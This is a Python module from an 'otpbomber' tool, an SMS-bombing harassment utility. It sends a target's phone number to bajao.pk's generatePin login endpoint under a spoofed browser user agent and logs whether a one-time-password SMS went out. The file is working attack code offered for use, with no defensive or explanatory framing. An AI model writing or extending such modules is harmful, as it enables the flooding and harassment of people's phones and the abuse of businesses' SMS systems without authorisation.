from otpbomber.core import *
from otpbomber.localuseragent import *

async def bajao(phone, client, out):
    name = 'bajao'
    domain = 'bajao.pk'
    frequent_rate_limit = False
    headers = {'X-Requested-With': 'XMLHttpRequest', 'User-Agent': random.choice(ua['browsers']['chrome']), 'Origin': 'https://bajao.pk', 'Referer': 'https://bajao.pk/linkAccount'}
    data = {'uuid': f'{phone[-10:]}'}
    response = await client.post('https://bajao.pk/api/v2/login/generatePin', headers=headers, data=data)
    try:
        response_data = response.json()
        if response_data.get('msg') == 'PIN has been sent via SMS to your phone number' or response_data.get('msg') == 'success':
            out.append({'name': name, 'domain': domain, 'frequent_rate_limit': frequent_rate_limit, 'rateLimit': False, 'sent': True, 'error': False})
            return None
        else:
            out.append({'name': name, 'domain': domain, 'frequent_rate_limit': frequent_rate_limit, 'rateLimit': False, 'sent': False, 'error': False})
            return None
    except Exception:
        out.append({'name': name, 'domain': domain, 'frequent_rate_limit': frequent_rate_limit, 'rateLimit': False, 'sent': False, 'error': True})
        return None